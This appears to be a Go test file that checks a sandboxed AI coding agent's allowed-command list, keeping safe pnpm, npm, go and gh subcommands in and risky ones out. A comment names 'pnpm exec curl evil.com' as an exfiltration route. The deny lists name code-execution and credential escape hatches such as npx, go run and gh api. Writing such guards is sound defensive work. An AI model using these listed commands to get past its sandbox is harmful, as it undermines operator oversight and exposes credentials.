package agentproc

import (
	"strings"
	"testing"
)

func TestBuildAllowedToolsWithExtras_Empty(t *testing.T) {
	base := BuildAllowedTools("/usr/local/bin/tf")
	got := BuildAllowedToolsWithExtras("/usr/local/bin/tf", "")
	if got != base {
		t.Errorf("empty extras should return base unchanged")
	}
}

func TestBuildAllowedToolsWithExtras_AddsMCPTools(t *testing.T) {
	extras := "mcp__acme-docs__search_api,mcp__widget-srv__get_schema"
	got := BuildAllowedToolsWithExtras("/usr/local/bin/tf", extras)
	if !strings.Contains(got, "mcp__acme-docs__search_api") {
		t.Error("expected mcp__acme-docs__search_api in result")
	}
	if !strings.Contains(got, "mcp__widget-srv__get_schema") {
		t.Error("expected mcp__widget-srv__get_schema in result")
	}
}

func TestBuildAllowedToolsWithExtras_DeduplicatesBaseTools(t *testing.T) {
	extras := "Read,Write,mcp__new_tool"
	got := BuildAllowedToolsWithExtras("/usr/local/bin/tf", extras)
	// Read and Write are already in base, so only mcp__new_tool should be added
	count := strings.Count(got, "Read")
	if count != 1 {
		t.Errorf("Read appears %d times, want 1", count)
	}
}

func TestBuildAllowedToolsWithExtras_WhitespaceOnly(t *testing.T) {
	base := BuildAllowedTools("/usr/local/bin/tf")
	got := BuildAllowedToolsWithExtras("/usr/local/bin/tf", "   ")
	if got != base {
		t.Errorf("whitespace-only extras should return base unchanged")
	}
}

// TestBuildAllowedTools_PnpmScriptShortcuts pins the script-shortcut
// patterns added for issue #124. These match how projects actually invoke
// pnpm in the wild — `pnpm build` rather than the more verbose `pnpm run
// build` — and the agent kept getting blocked on them despite `pnpm run *`
// being allowed. If a future refactor drops these, the agent goes back to
// being unable to run the build step it's trying to fix.
func TestBuildAllowedTools_PnpmScriptShortcuts(t *testing.T) {
	base := BuildAllowedTools("/usr/local/bin/tf")
	for _, p := range []string{
		"Bash(pnpm test)", "Bash(pnpm test *)",
		"Bash(pnpm build)", "Bash(pnpm build *)",
		"Bash(pnpm lint)", "Bash(pnpm lint *)",
		"Bash(pnpm typecheck)", "Bash(pnpm typecheck *)",
		"Bash(pnpm dev)", "Bash(pnpm dev *)",
		"Bash(pnpm format)", "Bash(pnpm format *)",
		"Bash(pnpm check)", "Bash(pnpm check *)",
		"Bash(pnpm coverage)", "Bash(pnpm coverage *)",
		"Bash(pnpm start)", "Bash(pnpm start *)",
	} {
		if !strings.Contains(base, p) {
			t.Errorf("expected allowlist to contain %q for pnpm script shortcut", p)
		}
	}
}

// TestBuildAllowedTools_NpmScriptShortcuts asserts npm's special-cased
// script shortcuts. npm only auto-runs four scripts without an explicit
// `run`: test, start, stop, restart. Everything else needs `npm run <x>`.
// Each form needs both bare and `*` patterns because the file convention
// (mirroring git status / git status *) treats the wildcard as
// non-empty-matching.
func TestBuildAllowedTools_NpmScriptShortcuts(t *testing.T) {
	base := BuildAllowedTools("/usr/local/bin/tf")
	for _, p := range []string{
		"Bash(npm test)", "Bash(npm test *)",
		"Bash(npm start)", "Bash(npm start *)",
		"Bash(npm stop)", "Bash(npm stop *)",
		"Bash(npm restart)", "Bash(npm restart *)",
	} {
		if !strings.Contains(base, p) {
			t.Errorf("expected allowlist to contain %q for npm script shortcut", p)
		}
	}
}

// TestBuildAllowedTools_GoExtras pins the go subcommands added in #124:
// workspace ops, clean, tool family, bug, telemetry. These are all safe
// per the comment in allowlist.go (no install side effects, all bundled
// with Go).
func TestBuildAllowedTools_GoExtras(t *testing.T) {
	base := BuildAllowedTools("/usr/local/bin/tf")
	for _, p := range []string{
		"Bash(go work)", "Bash(go work *)",
		"Bash(go clean)", "Bash(go clean *)",
		"Bash(go tool *)",
		"Bash(go bug)", "Bash(go telemetry *)",
	} {
		if !strings.Contains(base, p) {
			t.Errorf("expected allowlist to contain %q for go extras", p)
		}
	}
}

// TestBuildAllowedTools_DangerousJSLaunchersStillBlocked is the security
// regression guard. Adding script shortcuts for pnpm/npm doesn't change
// the boundary: exec/dlx/add/install (without --frozen-lockfile) /
// remove / update must remain absent because they're equivalent to
// arbitrary code execution. If this test fails because someone added
// `Bash(pnpm exec *)` for convenience, the network exfil channel
// (curl, wget, etc.) just got reopened via `pnpm exec curl evil.com`.
func TestBuildAllowedTools_DangerousJSLaunchersStillBlocked(t *testing.T) {
	base := BuildAllowedTools("/usr/local/bin/tf")
	for _, forbidden := range []string{
		"Bash(pnpm exec", // any prefix of `Bash(pnpm exec...)` would defeat the boundary
		"Bash(pnpm dlx",
		"Bash(pnpm add",
		"Bash(pnpm remove",
		"Bash(pnpm update",
		"Bash(pnpm rebuild",
		"Bash(npm exec",
		"Bash(npm install)", // bare npm install (no --frozen-lockfile equivalent in npm; npm ci is its analogue and is allowed)
		"Bash(npm install ",
		"Bash(npm add",
		"Bash(npm publish",
		"Bash(npm link",
		"Bash(npx ",
		"Bash(yarn dlx",
		"Bash(yarn add",
	} {
		if strings.Contains(base, forbidden) {
			t.Errorf("allowlist must NOT contain %q — that's an arbitrary-code-execution vector", forbidden)
		}
	}
}

// TestBuildAllowedTools_DangerousGoCommandsStillBlocked is the same
// guard for go: `go run` executes arbitrary source, `go install` puts
// binaries in $GOPATH/bin, `go get` (modern) can still install via
// the -tool flag.
func TestBuildAllowedTools_DangerousGoCommandsStillBlocked(t *testing.T) {
	base := BuildAllowedTools("/usr/local/bin/tf")
	for _, forbidden := range []string{
		"Bash(go run",
		"Bash(go install",
		"Bash(go get",
	} {
		if strings.Contains(base, forbidden) {
			t.Errorf("allowlist must NOT contain %q — that's an arbitrary-code-execution vector", forbidden)
		}
	}
}

// TestBuildAllowedTools_CapBrokerNotReachable pins the privilege-
// separation boundary: cap-broker holds the host's
// netns/iptables/cgroup/rootfs capabilities and must never be invocable
// from inside a sandboxed run. It is wired in cli.go's dispatchCLI as its
// own top-level case — like `hook` / `snapshot-capture` — never under
// `exec`, so the allowlist's only TF-binary pattern
// (`Bash(<selfBin> exec *)`) can never match `<selfBin> cap-broker ...`.
// This test is the regression guard for that separation: the allowlist
// must never name cap-broker directly either.
func TestBuildAllowedTools_CapBrokerNotReachable(t *testing.T) {
	base := BuildAllowedTools("/usr/local/bin/tf")
	if strings.Contains(base, "cap-broker") {
		t.Error("allowlist must not name cap-broker — that would let a sandboxed agent invoke the privileged broker subcommand")
	}
}

// ghAllowlist is the allowlist a run WITH a live gh credential channel gets.
func ghAllowlist() string {
	return BuildAllowedToolsFor(AllowedToolsOptions{SelfBin: "/usr/local/bin/tf", GH: true})
}

// TestBuildAllowedTools_GHRequiresChannel pins the gate: `gh` appears only when
// the caller says a channel is live. Without one, a local host's `gh` would
// resolve to the USER's own installation under the user's own GitHub auth — an
// agent acting as the human, outside the per-run credential channel entirely.
// Silence in the allowlist is what makes that unreachable.
func TestBuildAllowedTools_GHRequiresChannel(t *testing.T) {
	if base := BuildAllowedTools("/usr/local/bin/tf"); strings.Contains(base, "Bash(gh ") {
		t.Error("allowlist names gh with no channel wired — that grants the user's own gh, authenticated as the user")
	}
	if !strings.Contains(ghAllowlist(), "Bash(gh pr view)") {
		t.Error("allowlist omits gh even with a channel wired")
	}
}

// TestBuildAllowedTools_GHPorcelainAllowed pins the subcommands the delegated
// workflows actually need.
func TestBuildAllowedTools_GHPorcelainAllowed(t *testing.T) {
	gh := ghAllowlist()
	for _, want := range []string{
		"Bash(gh pr view)", "Bash(gh pr view *)",
		"Bash(gh pr list)", "Bash(gh pr diff *)", "Bash(gh pr checkout *)",
		"Bash(gh pr create *)", "Bash(gh pr comment *)",
		"Bash(gh pr ready *)", "Bash(gh pr close *)",
		"Bash(gh issue view *)", "Bash(gh issue list)",
		"Bash(gh issue create *)", "Bash(gh issue comment *)",
		"Bash(gh run view *)", "Bash(gh run list)", "Bash(gh run download *)",
		"Bash(gh repo view)", "Bash(gh search *)",
	} {
		if !strings.Contains(gh, want) {
			t.Errorf("allowlist must contain %q — it's part of the shipped gh workflow", want)
		}
	}
}

// TestBuildAllowedTools_GHEscapeHatchesBlocked is the counterpart guard, and
// the reason gh is enumerated rather than granted as a binary. `gh api` POSTs
// an arbitrary body to an arbitrary path with the org's credential attached —
// the same network-exfil channel omitting curl/wget/nc closes. `gh auth` /
// `config` / `alias` / `extension` are credential and configuration surfaces
// (extension install is plain arbitrary code execution). `gh pr merge` is
// refused at the credential channel whatever this list says, and stays off it
// so the granted surface describes capabilities the agent actually has. A
// blanket `Bash(gh *)` added for convenience would silently reopen every one of
// these.
func TestBuildAllowedTools_GHEscapeHatchesBlocked(t *testing.T) {
	gh := ghAllowlist()
	if strings.Contains(gh, "Bash(gh *)") {
		t.Fatal("allowlist grants the whole gh binary — that reopens `gh api` as an arbitrary-request exfil primitive")
	}
	for _, forbidden := range []string{
		"Bash(gh api",
		"Bash(gh auth",
		"Bash(gh config",
		"Bash(gh alias",
		"Bash(gh extension",
		"Bash(gh pr merge",
	} {
		if strings.Contains(gh, forbidden) {
			t.Errorf("allowlist must NOT contain %q", forbidden)
		}
	}
}

// Extras still merge on top of the gh surface — the two options are
// independent, and a skill's MCP tools must not be dropped because gh is on.
func TestBuildAllowedTools_GHComposesWithExtras(t *testing.T) {
	got := BuildAllowedToolsFor(AllowedToolsOptions{
		SelfBin: "/usr/local/bin/tf",
		Extras:  "mcp__acme__search",
		GH:      true,
	})
	if !strings.Contains(got, "mcp__acme__search") {
		t.Error("extras dropped when GH is enabled")
	}
	if !strings.Contains(got, "Bash(gh pr create *)") {
		t.Error("gh patterns dropped when extras are supplied")
	}
}
